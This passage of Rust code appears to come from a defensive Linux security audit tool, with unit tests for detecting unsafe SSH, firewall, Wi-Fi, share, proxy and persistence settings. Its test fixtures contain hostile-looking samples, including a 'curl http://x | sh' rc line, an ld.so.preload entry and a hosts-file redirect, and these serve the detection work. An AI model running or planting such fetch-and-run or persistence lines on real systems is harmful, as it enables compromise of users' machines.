fn update_findings(upgradable: &str, holds: &str) -> Vec<Finding> {
    let lines: Vec<&str> = upgradable.lines().filter(|l| l.contains("[upgradable from")).collect();
    let security = lines.iter().filter(|l| l.contains("-security")).count();
    let mut out = Vec::new();
    if !lines.is_empty() {
        let extra = if security > 0 {
            security.to_string()
        } else {
            String::new()
        };
        out.push(finding(13, i32::from(security > 0), "", extra, lines.len()));
    }
    let held: Vec<&str> = holds.lines().map(str::trim).filter(|l| !l.is_empty()).collect();
    if !held.is_empty() {
        out.push(finding(14, 0, held.join(", "), "", held.len()));
    }
    out
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn restart_needed_and_replaced_kernel() {
        let f = reboot_findings(Some("linux-base\nlibc6\nlibc6\n".into()), "6.8.0-1", false);
        assert_eq!((f[0].code, f[0].subject.as_str()), (11, "libc6, linux-base"));
        assert_eq!((f[1].code, f[1].subject.as_str()), (12, "6.8.0-1"));
        assert!(reboot_findings(None, "6.8.0-1", true).is_empty());
        assert!(reboot_findings(None, "", false).is_empty());
    }

    #[test]
    fn counts_updates_security_ones_and_holds() {
        let apt = "Listing...\na/noble-updates 1 amd64 [upgradable from: 0]\nb/noble-security,noble-security 2 all [upgradable from: 1]\n";
        let f = update_findings(apt, "linux-image-generic\n");
        assert_eq!((f[0].code, f[0].level, f[0].n, f[0].extra.as_str()), (13, 1, 2, "1"));
        assert_eq!((f[1].code, f[1].subject.as_str()), (14, "linux-image-generic"));
        let none = update_findings("Listing...\n", "");
        assert!(none.is_empty());
        assert_eq!(
            update_findings("a/x-updates 1 all [upgradable from: 0]", "")[0].level,
            0
        );
    }

    #[test]
    fn ufw_off_even_when_its_service_is_active() {
        let off = "# c\nENABLED=no\nLOGLEVEL=low\n";
        assert_eq!(ufw_problem(off, "active").as_deref(), Some("disabled"));
        assert_eq!(ufw_problem("ENABLED=yes\n", "active"), None);
        assert_eq!(ufw_problem("ENABLED=yes\n", "failed").as_deref(), Some("failed"));
        // No ufw.conf: ufw is not installed, so only the service answer is left.
        assert_eq!(ufw_problem("", "inactive").as_deref(), Some("inactive"));
    }

    #[test]
    fn listening_keeps_open_sockets_only_once() {
        let ss = "tcp LISTEN 0 50 0.0.0.0:445 0.0.0.0:* users:((\"smbd\",pid=7,fd=3))\n\
                  tcp LISTEN 0 50 [::]:445 [::]:*\n\
                  tcp LISTEN 0 4096 127.0.0.1:631 0.0.0.0:*\n\
                  udp UNCONN 0 0 127.0.0.53%lo:53 0.0.0.0:*\n\
                  udp UNCONN 0 0 *:5353 *:*\n";
        let f = parse_listening(ss);
        assert_eq!(f.len(), 2);
        assert_eq!((f[0].subject.as_str(), f[0].extra.as_str()), ("tcp 445", "smbd"));
        assert_eq!(f[0].n, 7);
        assert_eq!(f[1].subject, "udp 5353");
    }

    #[test]
    fn version_named_binary_takes_its_folder_name() {
        let exe = "/home/u/.local/share/claude/versions/2.1.314";
        assert_eq!(name_from_path("2.1.314", exe), "claude");
        assert_eq!(name_from_path("2.1.314", ""), "2.1.314");
        assert_eq!(program_name("firefox", 1), "firefox");
    }

    #[test]
    fn listening_groups_ports_by_program() {
        let ss = "tcp LISTEN 0 1 0.0.0.0:22000 0.0.0.0:* users:((\"syncthing\",pid=9,fd=3))\n\
                  udp UNCONN 0 0 0.0.0.0:21027 0.0.0.0:* users:((\"syncthing\",pid=9,fd=4))\n\
                  tcp LISTEN 0 1 0.0.0.0:139 0.0.0.0:*\n\
                  tcp LISTEN 0 1 0.0.0.0:445 0.0.0.0:*\n";
        let f = parse_listening(ss);
        assert_eq!(f.len(), 2);
        assert_eq!(f[0].subject, "udp 21027, tcp 22000");
        assert_eq!((f[1].subject.as_str(), f[1].extra.as_str()), ("tcp 139, tcp 445", ""));
    }

    #[test]
    fn connections_group_by_program_and_skip_loopback() {
        let ss = "0 0 10.0.0.2:5000 1.2.3.4:443 users:((\"firefox\",pid=1,fd=9))\n\
                  ESTAB 0 0 10.0.0.2:5001 5.6.7.8:443 users:((\"firefox\",pid=1,fd=10))\n\
                  0 0 127.0.0.1:1 127.0.0.1:2 users:((\"x\",pid=2,fd=1))\n";
        let f = parse_connections(ss);
        assert_eq!(f.len(), 1);
        assert_eq!((f[0].subject.as_str(), f[0].n), ("firefox", 2));
    }

    #[test]
    fn exe_paths() {
        assert_eq!(exe_level("/tmp/x/evil", "/home/u"), 2);
        assert_eq!(exe_level("/tmp/.mount_abc/app", "/home/u"), 0);
        assert_eq!(exe_level("/usr/bin/foo (deleted)", "/home/u"), 1);
        assert_eq!(exe_level("/home/u/.hidden/bin", "/home/u"), 1);
        assert_eq!(exe_level("/home/u/.vscode/server/node", "/home/u"), 0);
        assert_eq!(exe_level("/home/u/bin/tool", "/home/u"), 0);
        assert_eq!(exe_level("/home/u/.x", ""), 0);
        // A known-good word inside the path of a program that started elsewhere does not clear it.
        assert_eq!(exe_level("/tmp/b/.cargo/helper", "/home/u"), 2);
        assert_eq!(exe_level("/var/tmp/.mount_x/a", "/home/u"), 2);
        assert_eq!(exe_level("/home/u/.cache/.hidden/.vscode/x", "/home/u"), 1);
        assert_eq!(exe_level("/home/u/.cargo/bin/rg", "/home/u"), 0);
        assert_eq!(exe_level("/home/u/.vscode-server/bin/node", "/home/u"), 0);
    }

    #[test]
    fn rc_lines() {
        let t = "# curl comment\neval \"$(starship init zsh)\"\ncurl http://x | sh\neval $payload\n";
        assert_eq!(suspicious_rc_lines(t), vec!["curl http://x | sh", "eval $payload"]);
    }

    #[test]
    fn manifest_resolves_locale_names_and_flags_broad_access() {
        let m = r#"{"name":"__MSG_appName__","permissions":["storage","cookies"],"host_permissions":["<all_urls>"]}"#;
        let msgs = r#"{"appname":{"message":"Grammar Thing"}}"#;
        let (name, p) = parse_manifest(m, Some(msgs)).unwrap();
        assert_eq!(name, "Grammar Thing");
        assert_eq!(p, vec!["<all_urls>", "cookies"]);
        // A name that cannot be looked up keeps its placeholder; the add-on and its powers are still listed.
        let hidden = (
            "__MSG_appName__".to_string(),
            vec!["<all_urls>".to_string(), "cookies".to_string()],
        );
        assert_eq!(parse_manifest(m, None), Some(hidden.clone()));
        assert_eq!(
            parse_manifest(m, Some(r#"{"other":{"message":"x"}}"#)),
            Some(hidden.clone())
        );
        assert_eq!(parse_manifest(m, Some("not json")), Some(hidden));
    }

    #[test]
    fn firefox_skips_builtin_and_inactive() {
        let t = r#"{"addons":[
            {"type":"extension","active":true,"location":"app-profile","defaultLocale":{"name":"uBlock"},"userPermissions":{"permissions":["webRequest"],"origins":["<all_urls>"]}},
            {"type":"extension","active":true,"location":"app-system-defaults","defaultLocale":{"name":"Builtin"},"userPermissions":{"permissions":["cookies"],"origins":[]}},
            {"type":"extension","active":false,"location":"app-profile","defaultLocale":{"name":"Off"},"userPermissions":{"permissions":["cookies"],"origins":[]}}]}"#;
        assert_eq!(
            parse_firefox(t),
            vec![(
                "uBlock".to_string(),
                vec!["<all_urls>".to_string(), "webRequest".to_string()]
            )]
        );
    }

    #[test]
    fn persistence_reads_temp_dirs() {
        let dir = std::env::temp_dir().join(format!("fc-sec-{}", std::process::id()));
        let _ = fs::remove_dir_all(&dir);
        let (etc, home) = (dir.join("etc"), dir.join("home"));
        fs::create_dir_all(home.join(".ssh")).unwrap();
        fs::create_dir_all(&etc).unwrap();
        fs::write(etc.join("ld.so.preload"), "/lib/evil.so\n").unwrap();
        fs::write(
            home.join(".ssh/authorized_keys"),
            "ssh-ed25519 AAAA secret-key-material\n",
        )
        .unwrap();
        fs::write(home.join(".bashrc"), "curl http://x | sh\n").unwrap();
        let f = persistence(&Roots { etc, home }, "# m\n* * * * * /tmp/x\n");
        let codes: Vec<i32> = f.iter().map(|f| f.code).collect();
        assert_eq!(codes, vec![3, 4, 6, 7]);
        assert!(
            f.iter()
                .all(|f| !f.subject.contains("secret") && !f.extra.contains("secret"))
        );
        let _ = fs::remove_dir_all(&dir);
    }

    #[test]
    fn weak_wifi_only() {
        let f = wifi_findings("no:Open Cafe:\nyes:Home\\:5G:WPA2\nyes:Cafe:--\n");
        assert_eq!(
            (f.len(), f[0].code, f[0].level, f[0].n, f[0].subject.as_str()),
            (1, 15, 2, 0, "Cafe")
        );
        assert_eq!(wifi_findings("yes:Old:WPA1\n")[0].level, 1);
        assert_eq!(wifi_findings("yes:Old:WEP\n")[0].n, 1);
        assert!(wifi_findings("yes:Mixed:WPA1 WPA2\nyes:New:WPA3\n").is_empty());
    }

    #[test]
    fn sshd_first_value_wins_and_off_means_fine() {
        let c = |t: &str| vec![t.to_string()];
        assert_eq!(sshd_finding(false, &c("PermitRootLogin yes")).code, 24);
        assert_eq!(
            sshd_finding(true, &c("PasswordAuthentication no\nPermitRootLogin prohibit-password")).code,
            24
        );
        let f = sshd_finding(true, &c("# x\nPermitRootLogin yes\n"));
        assert_eq!(
            (f.code, f.subject.as_str()),
            (23, "PasswordAuthentication yes, PermitRootLogin yes")
        );
        // A drop-in read first beats the main file; `Match` blocks are ignored.
        let both = vec![
            "PasswordAuthentication no\n".to_string(),
            "PasswordAuthentication yes\n".to_string(),
        ];
        assert_eq!(sshd_finding(true, &both).code, 24);
        assert_eq!(
            sshd_finding(true, &c("PasswordAuthentication no\nMatch User x\nPermitRootLogin yes")).code,
            24
        );
    }

    #[test]
    fn hosts_flags_public_addresses_only() {
        let ok = "127.0.0.1 localhost\n::1 ip6-localhost\n0.0.0.0 ads.example\n192.168.1.5 nas # lan\nfe80::1 x\nfe00::0 ip6-localnet\n";
        assert_eq!(hosts_finding(ok).code, 26);
        let f = hosts_finding("8.8.8.8 bank.example www.bank.example\n# 9.9.9.9 off\n");
        assert_eq!(
            (f.code, f.n, f.subject.as_str()),
            (25, 1, "8.8.8.8 bank.example www.bank.example")
        );
    }

    #[test]
    fn arp_flags_a_shared_mac_only() {
        let n = |l: &[(&str, &str)]| {
            l.iter()
                .map(|(i, m)| (i.parse().unwrap(), m.to_string()))
                .collect::<Vec<_>>()
        };
        assert_eq!(
            arp_finding(&n(&[("10.0.0.1", "aa:01"), ("10.0.0.2", "aa:02")])).code,
            28
        );
        let f = arp_finding(&n(&[("10.0.0.1", "AA:01"), ("10.0.0.9", "aa:01")]));
        assert_eq!((f.code, f.subject.as_str()), (27, "aa:01 = 10.0.0.1 10.0.0.9"));
    }

    #[test]
    fn shares_open_to_everyone() {
        let smb =
            "[global]\n guest ok = yes\n[media]\n Guest  OK = Yes\n[docs]\n guest ok = no\n[pub]\n public = true ; x\n";
        assert_eq!(samba_open_shares(smb), ["media", "pub"]);
        assert_eq!(
            nfs_open_exports("# c\n/srv *(rw)\n/home 192.168.1.0/24(rw)\n/open\n/x (ro)\n"),
            ["/srv", "/open", "/x"]
        );
        assert_eq!(shares_finding(None, None).n, 0);
        assert_eq!(shares_finding(Some("[a]\n".into()), None).n, 1);
        let f = shares_finding(Some(smb.into()), Some("/srv *(rw)".into()));
        assert_eq!((f.code, f.subject.as_str()), (29, "Samba: media, pub; NFS: /srv"));
    }

    #[test]
    fn wifi_ok_says_what_was_checked() {
        let f = wifi_ok("yes:Home:WPA2\n").unwrap();
        assert_eq!((f.level, f.n, f.subject.as_str()), (-1, 3, "Home"));
        assert_eq!(wifi_ok("no:Other:WPA2\n").unwrap().n, 4);
        assert!(wifi_ok("").is_none());
    }

    #[test]
    fn open_autoconnect_skips_secured_and_manual() {
        let list = "Home:802-11-wireless:yes\nCafe:802-11-wireless:yes\nHotel:802-11-wireless:no\nVPN:vpn:yes\n";
        let f = open_autoconnect(list, |n| if n == "Home" { "wpa-psk".into() } else { String::new() }).unwrap();
        assert_eq!((f.subject.as_str(), f.n), ("Cafe", 1));
        assert!(open_autoconnect(list, |_| "wpa-psk".into()).is_none());
    }

    #[test]
    fn proxies_from_env_and_desktop() {
        let f = proxy_findings(
            "PATH=x\n# http_proxy=a\nexport HTTP_PROXY=http://1.2.3.4:80\nno_proxy=localhost\n",
            "'manual'\n",
        );
        let got: Vec<(&str, i32)> = f.iter().map(|f| (f.subject.as_str(), f.n)).collect();
        assert_eq!(got, vec![("HTTP_PROXY=http://1.2.3.4:80", 0), ("manual", 1)]);
        assert!(proxy_findings("", "'none'\n").is_empty());
    }

    #[test]
    fn extra_certs_lists_crt_files() {
        let dir = std::env::temp_dir().join(format!("fc-cert-{}", std::process::id()));
        let _ = fs::remove_dir_all(&dir);
        assert!(extra_certs(&dir).is_none());
        fs::create_dir_all(&dir).unwrap();
        fs::write(dir.join("corp.crt"), "x").unwrap();
        fs::write(dir.join("notes.txt"), "x").unwrap();
        assert_eq!(extra_certs(&dir).unwrap().subject, "corp.crt");
        let _ = fs::remove_dir_all(&dir);
    }

    #[test]
    fn failed_logins_count() {
        assert_eq!(
            parse_failed_logins("Failed password for root\nok\nauthentication failure; x\n"),
            2
        );
    }
}
